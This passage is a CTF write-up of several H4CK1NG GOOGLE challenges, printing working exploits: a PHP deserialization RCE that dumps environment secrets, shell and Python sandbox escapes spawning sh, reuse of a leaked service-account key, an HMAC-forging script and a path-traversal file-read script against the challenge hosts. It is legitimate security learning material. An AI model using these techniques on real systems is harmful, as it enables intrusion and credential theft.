In general, it's a bad idea to deserialize data straight from user input. Although I didn't have any direct experience with PHP deserialization, I played with a Python deserialization vulnerability in the past, so this immediately rang a bell.

What if I deserialize our `Stockfish` class instead of the expected move? In particular, the `$binary` attribute of that class looks a great candidate: I could replace the executable with anything we want to run: BOOM, RCE.

Unfortunately, deserialization alone won't work in this case, as we need something to actually use our object. After a brief Google investigation, I learned about PHP magic methods!

The magic methods that are relevant in our context are `__wakeup()`  and `__destruct()`. As the names suggest, `__wakeup()` is called when the object is instantiated, while `__destruct()` is invoked when the object is disposed.

And, yes, our `Stockfish` class defines a `__wakeup()` method, which does something clearly dangerous :)

```php
public function __wakeup()
{
    $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
    echo '<!--'.'wakeupcalled'.fgets($this->pipes[1], 4096).'-->';
}
```

Note: it's unlikely that IRL you will find something like this, an exploit served on a silver plate. Nevertheless, PHP deserialization can lead to [real life vulnerabilities](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) (edit: have you heard about [CVE-2022-22241](https://nvd.nist.gov/vuln/detail/CVE-2022-22241)?)

OK, we have everything we need. Let's write the exploit.

```php
<?php
class Stockfish
{
    public $binary = ['sh', '-c', 'cat /proc/self/environ'];
}

$object = new Stockfish();
$b64s = base64_encode(serialize($object));

$ch = curl_init("http://hackerchess2-web.h4ck.ctfcompetition.com/?move_end={$b64s}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, 0);
$data = curl_exec($ch);
curl_close($ch);

echo $data
?>
```

And run it!

```shell
❯ php ./exploit.php
<html>
<head>
    <title>Hackerchess v2</title>
[...]
<!--wakeupcalledGATEWAY_INTERFACE=CGI/1.1SHLVL=1REMOTE_ADDR=10.119.220.38QUERY_STRING=move_end=Tzo5OiJTdG9ja2Zpc2giOjE6e3M6NjoiYmluYXJ5IjthOjM6e2k6MDtzOjI6InNoIjtpOjE7czoyOiItYyI7aToyO3M6MjI6ImNhdCAvcHJvYy9zZWxmL2Vudmlyb24iO319ORIG_PATH_TRANSLATED=/web-apps/php/index.phpDOCUMENT_ROOT=/web-apps/phpREMOTE_PORT=32170REDIRECT_QUERY_STRING=move_end=Tzo5OiJTdG9ja2Zpc2giOjE6e3M6NjoiYmluYXJ5IjthOjM6e2k6MDtzOjI6InNoIjtpOjE7czoyOiItYyI7aToyO3M6MjI6ImNhdCAvcHJvYy9zZWxmL2Vudmlyb24iO319REDIRECT_DB_PASSWORD=e060286e9ecfa5b7f4984bcc77eb85f9SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at hackerchess2-web.h4ck.ctfcompetition.com Port 1337</address>
--><!-- XXX : Debug remove this HTTP_ACCEPT=*/*CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/SCRIPT_FILENAME=/web-apps/php/index.phpREDIRECT_DB_HOST=chess-ai-mysqlHTTP_HOST=hackerchess2-web.h4ck.ctfcompetition.comREDIRECT_HANDLER=application/x-nsjail-httpd-phpREQUEST_URI=/?move_end=Tzo5OiJTdG9ja2Zpc2giOjE6e3M6NjoiYmluYXJ5IjthOjM6e2k6MDtzOjI6InNoIjtpOjE7czoyOiItYyI7aToyO3M6MjI6ImNhdCAvcHJvYy9zZWxmL2Vudmlyb24iO319HTTP_X_FORWARDED_FOR=185.250.190.220, 34.110.161.129_=/usr/bin/nsjailSERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)REQUEST_SCHEME=httpHTTP_CONNECTION=Keep-AliveORIG_PATH_INFO=/index.phpPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binREDIRECT_URL=/index.phpORIG_SCRIPT_NAME=/cgi-bin/nsjail-php-cgiSERVER_PROTOCOL=HTTP/1.1REDIRECT_STATUS=200REQUEST_METHOD=GETSERVER_ADMIN=[no address given]SERVER_ADDR=10.120.2.149REDIRECT_FLAG2=https://h4ck1ng.google/solve/**REDACTED**PWD=/web-apps/phpHTTP_X_FORWARDED_PROTO=httpHTTP_X_CLOUD_TRACE_CONTEXT=a2347bb04543baed0cb0dac3d51c3b2f/10072948344364838778CONTEXT_PREFIX=/cgi-bin/SERVER_PORT=1337SCRIPT_NAME=/index.phpHTTP_VIA=1.1 googleORIG_SCRIPT_FILENAME=/usr/lib/cgi-bin/nsjail-php-cgiSERVER_NAME=hackerchess2-web.h4ck.ctfcompetition.com-->
```

And our flag is right there 😊

```text
https://h4ck1ng.google/solve/**REDACTED**
```

## EP002 - Detection and Response

Vigilance alone is not always enough. So, a company should have detection and response measure in place, to be ready to face cyber-fires.

### CHALLENGE 01

> This image might look familiar. But where have you seen it before?
>
> Hint: Sometimes the answers are hidden in plain site

In this challenge, you are given an image file, with the name of the CTF: "H4CK1NG G00GL3".

I was pretty confident that this was all about [steganography](https://en.wikipedia.org/wiki/Steganography):

> Steganography is the practice of concealing a message within another message or a physical object. In computing/electronic contexts, a computer file, message, image, or video is concealed within another file, message, image, or video.

#### Solution

To analyse the image I used [Aperisolve](https://www.aperisolve.com). This didn't solve the puzzle, but in the Zsteg box I saw something interesting:

```text
imagedata .. file: Apple DiskCopy 4.2 image , 16777472 bytes, 0x1 tag size, GCR CLV dsdd (800k), 0x0 format
b1,r,msb,xy .. file: GeoSwath RDF
b1,a,lsb,xy .. text: "tdbrbtrbrq"
b1,a,msb,xy .. text: "'E.&FNF.NFN"
b1,rgba,lsb,xy .. text: "-----BEGIN CERTIFICATE-----\nMIIDZzCCAk8CFBoKXnXdnNubl8olJdv40AxJ9wksMA0GCSqGSIb3DQEBBQUAMHAx\nCzAJBgNVBAYTAkNIMQ8wDQYDVQQIDAZadXJpY2gxOzA5BgNVBAoMMmh0dHBzOi8v\naDRjazFuZy5nb29nbGUvc29sdmUvNTNjdXIxVHlfQnlfMGI1Q3VyMXRZMRMwEQYD\nVQQDDApnb29nbGUuY29tMB4XDTIyMD"
b1,abgr,lsb,xy .. text: "KKKKK$*.)'@,*"
[...]
```

This is of course a huge hint :)

I started playing with zsteg, and in a couple of minutes I managed to decode the (self-signed) x509 cert…

```text
❯ zsteg ./challenge.png -E b1,rgba,lsb,xy -l 1244 | dd skip=1 bs=3 | openssl x509 -text -inform pem
Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number:
            1a:0a:5e:75:dd:9c:db:9b:97:ca:25:25:db:f8:d0:0c:49:f7:09:2c
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C = CH, ST = Zurich, O = https://h4ck1ng.google/solve/**REDACTED**, CN = google.com
        Validity
            Not Before: Sep 30 18:51:05 2022 GMT
[...]
```

… which contained the flag! Easy one.

### CHALLENGE 02

> After recent attacks, we've developed a search tool. Search the logs and discover what the attackers were after.
>
> HINT: Use the tool to be forensic in your search.

For this challenge, we are given a CSV file, and a readme.

The readme suggests using Timesketch to do some forensic.

> Timesketch is an open-source tool for collaborative forensic timeline analysis. Using sketches you and your collaborators can easily organize your timelines and analyze them all at the same time. Add meaning to your raw data with rich annotations, comments, tags and stars.

The readme also contains a storyline:

```text
Storyline:
Detectorsprotectors.biz is a cybersecurity company who is heavily invested in building software protections that protects flux capacitors on fire protection hardware.

A recent junior hire was tasked with deploying a kiosk machine at the reception to enable guests to quickly check-in. Unfortunately, one of the applications on the kiosk machine was outdated and lacked key patches.

A malicious actor has managed to compromise the machine.

Your task is to follow the log file provided, uncover the actions performed and find the flag.
We suspect that a number of reconnaissance activities have taken place using powershell.exe. The attacker probably made use of a RAT and established an exfiltration channel.
[...]
```

#### Solution

Installing Timesketch turned out to be a pain for me. I have a M1 Mac and a Docker server with limited resources, so I decided to look online for a demo.

I found what probably was an official demo, and I could log in with easily guessable credentials (I will leave this part to the reader).

I created a new investigation, uploaded the CSV file, and began to explore the data.

We know the attacker used PowerShell and a RAT (Remote Access Trojan), so I searched for PowerShell usage, getting more than 4.5k results. The last match (i.e., sorting by time, descending), contained the [defanged](https://isc.sans.edu/forums/diary/Defang+all+the+things/22744/), flag!

```text
PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName="exfil-xbhqwf-$($SourceFile.name)";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/**REDACTED**
}/$RemoteName;
```

Another easy success.

### CHALLENGE 03

> Welcome to the shell. See if you can leave. ``socat FILE:`tty`,raw,echo=0 TCP:quarantine-shell.h4ck.ctfcompetition.com:1337``
>
> Hint: How can you ask the shell for which commands are available?

We clearly need to execute that command… (but don't forget to do it in a sandbox!)

```shell
❯ socat FILE:`tty`,raw,echo=0 TCP:quarantine-shell.h4ck.ctfcompetition.com:1337
== proof-of-work: disabled ==
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

   ___                                    _    _                ____   _            _  _
  / _ \  _   _   __ _  _ __  __ _  _ __  | |_ (_) _ __    ___  / ___| | |__    ___ | || |
 | | | || | | | / _` || `__|/ _` || `_ \ | __|| || `_ \  / _ \ \___ \ | `_ \  / _ \| || |
 | |_| || |_| || (_| || |  | (_| || | | || |_ | || | | ||  __/  ___) || | | ||  __/| || |
  \__\_\ \__,_| \__,_||_|   \__,_||_| |_| \__||_||_| |_| \___| |____/ |_| |_| \___||_||_|

The D&R team has detected some suspicious activity on your account and has quarantined you while they investigate
948 days stuck at ~
```

#### Solution

Pressing `<tab>` twice, we can see the list of available commands:

```shell
~ $
!                    enable               quarantine_protocol
.                    esac                 read
:                    eval                 readarray
[                    exec                 readonly
[[                   exit                 return
]]                   export               select
_dnr_toolkit         false                set
alias                fc                   shift
bg                   fg                   shopt
bind                 fi                   source
break                for                  suspend
builtin              function             test
caller               getopts              then
case                 hash                 time
cd                   help                 times
command              history              trap
compgen              if                   true
complete             in                   type
compopt              jobs                 typeset
continue             kill                 ulimit
coproc               let                  umask
declare              local                unalias
dirs                 logout               unset
disown               mapfile              until
do                   popd                 wait
done                 printf               while
echo                 pushd                {
elif                 pwd                  }
else                 quarantine
~ $
```

Unfortunately, most commands are restricted by the "sandboxed shell" environment we are in:

```shell
~ $ test
command blocked: test
check completions to see available commands
~ $ $(test)
command blocked: $(test)
check completions to see available commands
~ $ `test`
command blocked: `test`
check completions to see available commands
```

Our duty, if it wasn't clear, is to escape this quarantined shell and find the flag.

A few commands caught my attention, as you don't typically see them every day. To name some:

```shell
_dnr_toolkit
coproc
quarantine
quarantine_protocol
[...]
```

I had high expectations from `coproc` and `time` but it turned out to be a dead-end.

We can't run these commands but, specifically for `quarantine` and `quarantine_protocol`, I wonder what would happen if the system couldn't find them...

From my Systems interviews, I remembered the priority of shell commands:

> Aliases > Shell reserved words > Functions > Built-in commands > "File system" commands

So, what if we defined a function named `quarantine` or `quarantine_protocol`? The `function` keyword is not restricted, fortunately!

After a few iterations, I came up with this:

```shell
~ $ function quarantine_protocol { /bin/bash; }
~ $ ls
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
user@NSJAIL:/home/user$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

Bingo 🙂 As it turns out, the flag is in `/`.

```shell
user@NSJAIL:/home/user$ cat /flag
https://h4ck1ng.google/solve/**REDACTED**
```

## EP003 - Red Team

"To make sure things are safe, sometimes, you need someone to break them."

Red Team emulate attackers' behaviour and try to hack you before they will do it.

### CHALLENGE 01

> Can you hunt down the secret corporate documents? ``socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337``
>
> Hint: Find the key, and put RFC 6749 to use

RFC 6749 is about "The OAuth 2.0 Authorization Framework".

And if we execute the socat command, we are asked for a password:

```shell
❯ socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337
== proof-of-work: disabled ==
Password:
```

#### Solution

The first part of the challenge is to find the password… There is a nice hint in the into:

> Blink and you'll miss it (9:29). Blink and you'll miss it again (15:09).

In fact, at 15:09 of the intro video contains the password you need. But unfortunately that doesn't bring us far:

```shell
❯ socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337
== proof-of-work: disabled ==
Password:
**REDACTED**
*** Congratulations! ***
*** https://h4ck1ng.google/solve/**REDACTED** ***
developer@googlequanta.com:/home/developer$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)
```

There is no flag on this machine, but we can find an interesting `todo.txt` in `developer`'s directory:

```text
developer@googlequanta.com:/home/developer$ cat todo.txt
Today
[x] Added backup-tool@project-multivision.iam.gserviceaccount.com with viewer-access to super sensitive design doc
[x] Tried activating service account with gcloud, but didn't give me a documents.readonly scope
[x] Cleaned up service account key from disk before signing off

Tomorrow
[] Finish writing Google Drive backup script
```

There is also a backup script, `backup.py`, that uses Google Cloud API, to make a backup of some document:

```python
developer@googlequanta.com:/home/developer$ cat backup.py
"""
[WIP]
Regularly backup sensitive Google Drive files to disk
"""

import json
import requests
from time import sleep

doc_id = "1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM"

def get_file(token, file_id):
    resp = requests.get(
        f'https://docs.googleapis.com/v1/documents/{file_id}',
        headers={'Authorization': f'Bearer {token}'},
    )
    file_content = ""
    if resp.status_code != 200:
        print(f"Yikes!\n{resp.text}")
    else:
        file_content = json.loads(resp.text)['body']
    return file_content

def get_token():
    # TODO: I know it'll work with a 'documents.readonly' scope...
    # ...just need to get the access token
    pass

# Backup file every hour
while True:
    with open('backup.txt', 'a') as f:
        f.write(get_file(get_token(), doc_id))
    sleep(3600)
```

The shell history also contains some goodies:

```shell
developer@googlequanta.com:/home/developer$ history
    1  gcloud auth activate-service-account --key-file /home/developer/sa.json backup-tool@project-multivision.iam.gserviceaccount.com
    2  vim ~/backup.py
    3  rm /home/user/sa.json
    4  exit
[...]
```

`sa.json` looks exactly what we needed to enable the backup script, but unfortunately, it has been deleted.

Or, has it?

When you with work with APIs, like cloud stuff, chances are that your directory contains some token or some other juicy configuration setting.

And, as it turns out, after some research, I found that gcloud authentication does store the user key file:

```shell
developer@googlequanta.com:/home/developer$ cat .config/gcloud/legacy_credentials/backup-tool@project-multivision.iam.gserviceaccount.com /adc.json
{
  "client_email": "backup-tool@project-multivision.iam.gserviceaccount.com",
  "client_id": "105494657484877589161",
  "private_key": "-----BEGIN PRIVATE KEY-----\n**REDACTED**\n-----END PRIVATE KEY-----\n",
  "private_key_id": "722d66d6da8d6d5356d73d04d9366a76c7ada494",
  "token_uri": "https://oauth2.googleapis.com/token",
  "type": "service_account"
}
```

We only need to export this file on our attack box and use some gcloud CLI:

```shell
❯ gcloud auth activate-service-account --key-file key.json backup-tool@project-multivision.iam.gserviceaccount.com
Activated service account credentials for: [backup-tool@project-multivision.iam.gserviceaccount.com]

❯ export TOKEN=$(gcloud auth print-access-token --scopes https://www.googleapis.com/auth/documents.readonly)

❯ curl -s -H "Authorization: Bearer ${TOKEN}" \
    https://docs.googleapis.com/v1/documents/1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM

{
  "title": "[NTK] Secret Blueprints",
[...]
                "content": "https://h4ck1ng.google/solve/**REDACTED**\n",
[...]
```

### CHALLENGE 02

> You got in, but can you get out? Better run fast. ``socat FILE:`tty`,raw,echo=0 TCP:shell-sprinter.h4ck.ctfcompetition.com:1337`` (Shift+Q to quit)
>
> Hint: If you ain't cheating, you ain't trying

Yet another game. Yet another hint suggesting you should be cheating, somehow.

This is a sort of CLI RPG game. You need to find the password to use the access point. The password is split in 3 parts, and you need to collect them, opening key-locked doors and dodging enemies.

#### Solution

The first time I tackled this challenge, I had no clue about how to cheat. I tried several keys and key-combos, without joy.

So, I played it.

In the dungeon you will find several geo coordinates, with some info like "pass-phrases" or codes. These are not useful for this challenge, but are related to a real-world treasure hunt.

Once you finish the game, you get an additional hint about an "cheat code used long time ago"…

My favourite cheat code is IDDQD, but unfortunately, it wasn't this one 🙂 Instead the hint referred to another legendary cheat: the [Konami Code](https://en.wikipedia.org/wiki/Konami_Code):

> UP, UP, DOWN, DOWN, LEFT, RIGHT, LEFT, RIGHT, B, A

Using this code in the game (after pressing enter) you are presented with a prompt and a sort of console

```python
\ help                                                \
\ name 'help' is not defined                          \
\                                                     \
[...]
\                                                     \
\                                                     \
#######################################################
 >>> [Enter - continue, r - return to game]
```

Soon enough, I realized that this thing accepted *some* Python command:

```python
\ print('dguerri')                                    \
\ dguerri                                             \
\
```

Notably, `import` doesn't work. So, we cannot, for instance, execute system commands (e.g., `import os` + `os.system("sh")`).

Being a sort of sandbox, we need to escape it and find the flag. Knowing that sandboxing Python is basically impossible, I had high hope for this lead.

Searching the Internet, I found this great write-up: [The Craziest Python Sandbox Escape](https://www.reelix.za.net/2021/04/the-craziest-python-sandbox-escape.html).

This article contains everything we need, but we can't use the proposed exploit as it is because:

- we have a limit on the length of each line of code we can input in this "shell";
- we don't need to use creativity to "compose" any strings;
- our sandbox doesn't appear to have any persistence, besides the `config` object used by the game.

After few iterations, also after 1 hour spent on printing available methods and attributes in `config`, I came up with this exploit. The first part just activates the shell entering the cheat code, while the second part escapes the sandbox:

```python
❯ echo -e '..wwssadadba
config.logger = str.__base__.__subclasses__()[84]()\n
config.logger = config.logger.load_module("builtins")\n
config.logger = config.logger.__import__("os")\n
config.logger.system("sh")\n
pwd\nwhich cat\ncat ./flag\n' | nc shell-sprinter.h4ck.ctfcompetition.com 1337
\\ @_shell ]=~~-#######################################
\                                                     \
[...]
\                                                     \
#######################################################
 >>> config.logger.system("sh")/home/user
/usr/bin/cat
https://h4ck1ng.google/solve/**REDACTED**
```

Basically, I leveraged `config.logger` to maintain some persistence and I started to build the commands needed to bring back `builtins` module and, thus, `import`.

`str.__base__.__subclasses__()[84]()` will give us an instance of the 84th subclass of `object` class: a `_frozen_importlib.BuiltinImporter` object. We can use that to load the `builtins` module and then invoke `__import__()` to get the `os` module.

The last step is to call `os.system("sh")` to get a shell.

### CHALLENGE 03

> This corgi made a mess, clean it up.
>
> Hint: Maybe support can help debug the subscriber problem?

We are given an apk and a qr code image.

#### Solution

The qr code contains a reference to the following site:

[https://corgis-web.h4ck.ctfcompetition.com/aHR0cHM6Ly9jb3JnaXMtd2ViLmg0Y2suY3RmY29tcGV0aXRpb24uY29tL2NvcmdpP0RPQ0lEPWZsYWcmX21hYz1kZWQwOWZmMTUyOGYyOTgwMGIxZTczM2U2MjA4ZWEzNjI2NjZiOWVlYjVmNDBjMjY0ZmM1ZmIxOWRhYTM2OTM5](https://corgis-web.h4ck.ctfcompetition.com/aHR0cHM6Ly9jb3JnaXMtd2ViLmg0Y2suY3RmY29tcGV0aXRpb24uY29tL2NvcmdpP0RPQ0lEPWZsYWcmX21hYz1kZWQwOWZmMTUyOGYyOTgwMGIxZTczM2U2MjA4ZWEzNjI2NjZiOWVlYjVmNDBjMjY0ZmM1ZmIxOWRhYTM2OTM5)

The base64 in the path leads to:

[https://corgis-web.h4ck.ctfcompetition.com/corgi?DOCID=flag&_mac=ded09ff1528f29800b1e733e6208ea362666b9eeb5f40c264fc5fb19daa36939](https://corgis-web.h4ck.ctfcompetition.com/corgi?DOCID=flag&_mac=ded09ff1528f29800b1e733e6208ea362666b9eeb5f40c264fc5fb19daa36939)

Now, I am pretty sure we are supposed to side-load the apk… I don't have an Android phone (only the work one), but even if I had one, I would never side-load a random apk 💩 So, I decompiled the apk using [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Specifically, I installed it via the provided Dockerfile.

Note: I later discovered that there is an [online demo here](https://mobsf.live), but I recommend using a local version because I noticed some inconsistencies on the demo version.

I upload the apk to MobSF. It did an outstanding job and immediately highlighted some potential hardcoded secrets :)

```text
POSSIBLE HARDCODED SECRETS

"hmac_shared_secret" : "uBvB5rPgH0U+yPhzPq9y2i4f1396t/2dCpo3gd7l1+0="
```

Awesome. I then went to VSCode and started browsing the application's code.

After some source research, I found that the app can scan qr-codes (unsurprisingly) and issue API calls.

The important bits are in `google/ h4ck1ng / secretcorgis`. Specifically, `NetworkKt`, `CorgiRequest*`, `SecureCorgi` and `CorgiNetwork*` classes are important. The latter uses a `CorgiNetwork.sharedSecret` which is super interesting :)

The application crafts an HTTP GET request to `https://corgis-web.h4ck.ctfcompetition.com/corgi`, using the following headers:

- X-Document-ID
  - The most straightforward choice here seems to be `flag`, as it's in the above b64-encoded URL
- X-Request-Nonce
  - The application just throws 32 bytes of random data in here, presumably to prevent replay attacks
- X-User-Subscribed
  - This is a boolean. I suspected immediately that we need to set it to `true`
- X-Timestamp
  - The application just uses the current Unix timestamp, in seconds, presumably to enforce some freshness of the message
- X-Auth-MAC
  - This is a HMAC-SHA256 of a string obtained from all the above headers and values (see code below), using the shared secret I mentioned above.

Here is the relevant part of the decompiled code (edited for clarity):

```java
public static final Object makeSecretRequest(CorgiRequest corgiRequest, Continuation<? super String> continuation) {
    OkHttpClient okHttpClient = new OkHttpClient();
    Request.Builder url = new Request.Builder().url(corgiRequest.getCorgiServer());
    url.addHeader(DOC_ID_HEADER, corgiRequest.getCorgiId());
    url.addHeader(NONCE_HEADER, corgiRequest.getNonce());
    url.addHeader(TIMESTAMP_HEADER, corgiRequest.getTimestamp());
    url.addHeader(HMAC_SIG_HEADER, corgiRequest.getSignature());
    if (corgiRequest.isSubscriber()) {
        url.addHeader(SUBSCRIBER_HEADER, "true");
    }
    return BuildersKt.withContext(Dispatchers.getIO(), new NetworkKt$makeSecretRequest$2(okHttpClient, url.build(), null), continuation);
}

[...]

public static final String generateSignature(CorgiRequest corgiRequest) {
    String str;
    if (corgiRequest.isSubscriber()) {
        StringBuilder sb = new StringBuilder();
        String upperCase = DOC_ID_HEADER.toUpperCase(Locale.ROOT);
        StringBuilder append = sb.append(upperCase).append('=').append(corgiRequest.getCorgiId()).append(',');
        String upperCase2 = NONCE_HEADER.toUpperCase(Locale.ROOT);
        StringBuilder append2 = append.append(upperCase2).append('=').append(corgiRequest.getNonce()).append(',');
        String upperCase3 = TIMESTAMP_HEADER.toUpperCase(Locale.ROOT);
        StringBuilder append3 = append2.append(upperCase3).append('=').append(corgiRequest.getTimestamp()).append(',');
        String upperCase4 = SUBSCRIBER_HEADER.toUpperCase(Locale.ROOT);
        str = append3.append(upperCase4).append('=').append(corgiRequest.isSubscriber()).toString();
    } else {
        StringBuilder sb2 = new StringBuilder();
        String upperCase5 = DOC_ID_HEADER.toUpperCase(Locale.ROOT);
        StringBuilder append4 = sb2.append(upperCase5).append('=').append(corgiRequest.getCorgiId()).append(',');
        String upperCase6 = NONCE_HEADER.toUpperCase(Locale.ROOT);
        StringBuilder append5 = append4.append(upperCase6).append('=').append(corgiRequest.getNonce()).append(',');
        String upperCase7 = TIMESTAMP_HEADER.toUpperCase(Locale.ROOT);
        str = append5.append(upperCase7).append('=').append(corgiRequest.getTimestamp()).toString();
    }
    return sign(str);
}

public static final String sign(String message) {
    byte[] decode = Base64.decode(CorgiNetwork.Companion.getSharedSecret(), 0);
    Mac mac = Mac.getInstance("HmacSHA256");
    mac.init(new SecretKeySpec(decode, "HmacSHA256"));
    Charset UTF_8 = StandardCharsets.UTF_8;
    byte[] bytes = message.getBytes(UTF_8);
    byte[] doFinal = mac.doFinal(bytes);
    return ByteArraysKt.toHexString(doFinal);
}
```

The API endpoint is built in `CorgiRequest` :

```java
String str2 = corgiDataUri.getScheme() + "://" + corgiDataUri.getAuthority() + corgiDataUri.getPath();
```

Given all the above, I crafted the exploit as follows:

```python
#!/usr/bin/env python3

import base64
import hashlib
import hmac
import random
import requests
import time

URL = "https://corgis-web.h4ck.ctfcompetition.com/"

SHARED_SECRET = "uBvB5rPgH0U+yPhzPq9y2i4f1396t/2dCpo3gd7l1+0="

DOC_ID_HEADER = "X-Document-ID"
HMAC_SIG_HEADER = "X-Auth-MAC"
NONCE_HEADER = "X-Request-Nonce"
SUBSCRIBER_HEADER = "X-User-Subscribed"
TIMESTAMP_HEADER = "X-Timestamp"

docid = "flag"
nonce = hashlib.sha256(random.randbytes(32)).hexdigest()
ts = str(int(time.time()))
subscriber = "true"

stuff = (f"{DOC_ID_HEADER.upper()}={docid},"
         f"{NONCE_HEADER.upper()}={nonce},"
         f"{TIMESTAMP_HEADER.upper()}={ts},"
         f"{SUBSCRIBER_HEADER.upper()}={subscriber}")

hmac = hmac.new(
    base64.b64decode(SHARED_SECRET),
    msg=bytes(stuff, "utf-8"),
    digestmod=hashlib.sha256).hexdigest()

headers = {
    DOC_ID_HEADER: docid,
    NONCE_HEADER: nonce,
    TIMESTAMP_HEADER: ts,
    SUBSCRIBER_HEADER: "true",
    HMAC_SIG_HEADER: hmac,
}

url = f"{URL}corgi"

r = requests.get(url, headers=headers)
print(r.text)
```

And got the flag!

```shell
❯ ./exploit.py
{"subscriberOnly":true,"text":"Secret message","title":"Secret flag data","url":"https://h4ck1ng.google/solve/**REDACTED**"}
```

## EP004 - Bug Hunters

### CHALLENGE 01

> This endpoint is used by the VRP website to download attachments. It also has a rarely-used endpoint for importing bulk attachments, probably used for backups or migrations. Maybe it contains some bugs?
>
> Hint: Some of the pages on this version of the website are different, look around for hints about new endpoints.

The link brings us to a website: [https://vrp-website-web.h4ck.ctfcompetition.com](https://vrp-website-web.h4ck.ctfcompetition.com)

#### Solution

The first thing I did is explore the site. As suggested, some pages are different from the "real" [Google's bug bounty website](https://bughunters.google.com).

One in particular, the FAQ page, has links to the endpoints mentioned in the challenge description:

```text
Q: Why did my attachment fail to upload?

A: To debug, you should call the /import endpoint manually and look at the detailed error message in the response. The same applies to the /export endpoint for downloading attachments from a submission.
```

- [https://path-less-traversed-web.h4ck.ctfcompetition.com/import](https://path-less-traversed-web.h4ck.ctfcompetition.com/import) throws immediately an error: `only POST allowed`;
- [https://path-less-traversed-web.h4ck.ctfcompetition.com/export](https://path-less-traversed-web.h4ck.ctfcompetition.com/export) returns: `missing submission parameter`.

Playing with the export endpoint I got:

```shell
❯ curl -s -G https://path-less-traversed-web.h4ck.ctfcompetition.com/export --data-urlencode 'submission=1'
missing attachment parameter

❯ curl -s -G https://path-less-traversed-web.h4ck.ctfcompetition.com/export --data-urlencode 'submission=1' --data-urlencode 'attachment=1'
submission /web-apps/go/1 does not exist (try our sample_submission?)
```

I started playing with the export endpoint, in the hope to find some path traversal vulnerability. The application seems to filter `..` and `/` on the attachment parameter, and although at first, it seems that the submission parameter is vulnerable to path traversal, after few tries I couldn't exploit it.

So back to square one. Yeah, but we have gained some knowledge: the application probably run under `/web-apps`. It's probably a Golang app (given the directory layout we saw in previous challenges). We also learned about 2 parameters: `submission`, which identifies a  directory on the target box, and `attachment`, which seems to refer to a file.

Then I started playing with the import endpoint. And got an interesting message:

```shell
❯ curl -s -X POST https://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=sample_submission
server undergoing migration, import endpoint is temporarily disabled (dry run still enabled)
```

It took me several tries to guess the parameter to enable the dry run. Assuming that the language used for the application is Go, helped a bit (i.e., camel-case variable names):

```shell
❯ curl -s -X POST https://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=1\&dryRun\=true
could not open file <nil>: request Content-Type isn't multipart/form-data
```

Ah! So now the endpoint expects form-data… After some tests, remembering the batch-import "tip" in the challenge description, I found the right name for the file upload:

```shell
❯ curl -s  http://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=1\&dryRun\=true \
    -F 'file=@/etc/issue'
could not open file <nil>: http: no such file

❯ curl -s  http://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=1\&dryRun\=true \
    -F 'upload=@/etc/issue'
could not open file <nil>: http: no such file

❯ curl -s http://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=1\&dryRun\=true \
    -F 'attachments=@/etc/issue'
could not open file issue with gzip: gzip: invalid header
```

So, I leaned that the app is expecting a gzip file. I tried with a tar.gz file first:

```shell
❯ curl -s http://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=1\&dryRun\=true \
    -F 'attachments=@a.tar.gz'
new file: 1/a.txt
```

Oh! After few tests, also attempting some directory traversal, I came across this interesting message:

```shell
❯ tar cvfz a.tar.gz issue --transform 's,^,../../../etc/,'
issue

❯ tar tvfz a.tar.gz
tar: Removing leading `../../../' from member names
-rw-r--r-- gt/gt            50 2022-10-15 23:18 ../../../etc/issue

❯ curl -s http://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=1\&dryRun\=true \
    -F 'attachments=@a.tar.gz'
WARNING: file ../../etc/issue already exists and would get overwritten (enable debug to see differences)
```

Let's try that debug thing:

```shell
curl -s http://path-less-traversed-web.h4ck.ctfcompetition.com/import\?submission\=1\&dryRun\=true\&debug=true \
    -F 'attachments=@a.tar.gz'
WARNING: file ../../etc/issue already exists and would get overwritten (enable debug to see differences)
showing existing and new contents:
=====
< Welcome to Alpine Linux 3.16
< Kernel \r on an \m (\l)
<
<
-----
> *************************************************
>
=====
```

Yes!  The app shows us the diff between the remote file and the one in our tarball. While testing some more, I noticed that the submission `parameter` accepts absolute paths, so I didn't need to use the tar trick shown above.

Here is the final exploit I wrote using Python, I was extremely lucky to find the flag straight away in `/flag` :)

```python
#!/usr/bin/env python3

import io
import requests
import tarfile


URL = "https://path-less-traversed-web.h4ck.ctfcompetition.com/import"

fh = io.BytesIO()
with tarfile.open(fileobj=fh, mode='w:gz') as tar:
    info = tarfile.TarInfo('flag')
    info.size = 0
    tar.addfile(info, "")

files = {"attachments": fh.getvalue()}

r = requests.post(
    f"{URL}?submission=/&debug=true&dryRun=true",
    files=files)

print(r.text)
```

```shell
❯ ./exploit.py
WARNING: file /flag already exists and would get overwritten (enable debug to see differences)
showing existing and new contents:
=====
